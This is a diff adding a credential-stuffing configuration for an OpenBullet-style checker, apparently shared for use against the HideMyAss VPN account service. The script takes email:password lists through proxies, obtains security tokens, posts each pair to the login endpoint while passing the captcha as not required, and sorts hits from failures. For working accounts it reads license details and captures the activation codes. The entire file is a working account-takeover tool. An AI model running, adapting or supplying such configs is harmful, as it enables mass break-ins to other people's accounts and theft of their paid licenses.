@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "HideMyAss!",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-05T21:25:57.3324757+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_security_token_(POST) REQUEST POST "https://id.hidemyass.com/service/single/MetaService/securityToken" AutoRedirect=TRUE 
+  CONTENT "{\"correlationId\":1,\"operationName\":\"securityToken\",\"payload\":[],\"serviceName\":\"MetaService\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://my.hidemyass.com/en-eu/" 
+  HEADER "Origin: https://my.hidemyass.com" 
+#PARSE_security_token PARSE "<SOURCE>" JSON "operationResult" Recursive=FALSE -> VAR "SECURITYTOKEN" "" "" 
+#PARSE_playsession PARSE "<COOKIES(PLAY_SESSION)>" LR "" "" Recursive=FALSE -> VAR "PLAYSESSION" "" "" 
+#PARSE_playsession_DATA PARSE "<PLAYSESSION>" LR "" "" Recursive=FALSE -> VAR "PLAYSESSIONDATA" "" "" 
+#REQUEST_login_(POST) REQUEST POST "https://id.hidemyass.com/service/single/LoginService/login" AutoRedirect=TRUE 
+  CONTENT "{\"correlationId\":5,\"operationName\":\"login\",\"payload\":[{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"rememberMe\":false,\"captcha_response\":\"NOTREQUIRED\"},{\"allowAuthenticated\":true,\"extraLoginTicket\":false}],\"securityToken\":\"<SECURITYTOKEN>\",\"serviceName\":\"LoginService\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://my.hidemyass.com/en-eu/" 
+  HEADER "Origin: https://my.hidemyass.com" 
+  HEADER "Cookie: _ga=GA1.2.1174265920.1527657592; _gid=GA1.2.342726465.1528226446; locale2=en-eu; PLAY_SESSION=\"<PLAYSESSIONDATA>\"; _gat_UA-950416-58=1; _gaexp=GAX1.2.gaLVT0HkQLO-PzMilUglmQ.17776.1; __zlcmid=mlhOWoCl0LFfog; _uetsid=_uet61fc7057" 
+#CHECK_Good/Bad KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "error.form.bad.credentials" 
+#REQUEST_security_token_2_(POST) REQUEST POST "https://my.hidemyass.com/SecurityController/securityToken" AutoRedirect=TRUE 
+  CONTENT "{\"correlationId\":123,\"operationName\":\"securityToken\",\"serviceName\":\"SecurityController\",\"payload\":[]}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://my.hidemyass.com/en-us/" 
+  HEADER "Origin: https://my.hidemyass.com" 
+#PARSE_security_token_2 PARSE "<SOURCE>" JSON "operationResult" Recursive=FALSE -> VAR "SECURITYTOKEN2" "" "" 
+#REQUEST_acc_info_(POST) REQUEST POST "https://my.hidemyass.com/LicenseController/licenseInfoList" AutoRedirect=TRUE 
+  CONTENT "{\"correlationId\":127,\"operationName\":\"licenseInfoList\",\"serviceName\":\"LicenseController\",\"payload\":[],\"securityToken\":\"<SECURITYTOKEN2>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://my.hidemyass.com/en-us/" 
+  HEADER "Origin: https://my.hidemyass.com" 
+#CHECK_for_autorenew KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "autoRenewal\":false" 
+  KEYCHAIN Success OR 
+    KEY "autoRenewal\":true" 
+#PARSE_actication_code PARSE "<SOURCE>" LR "walletKeys\":[\"" "\"]" Recursive=FALSE -> CAP "ACTIVATION CODE" "" "" 
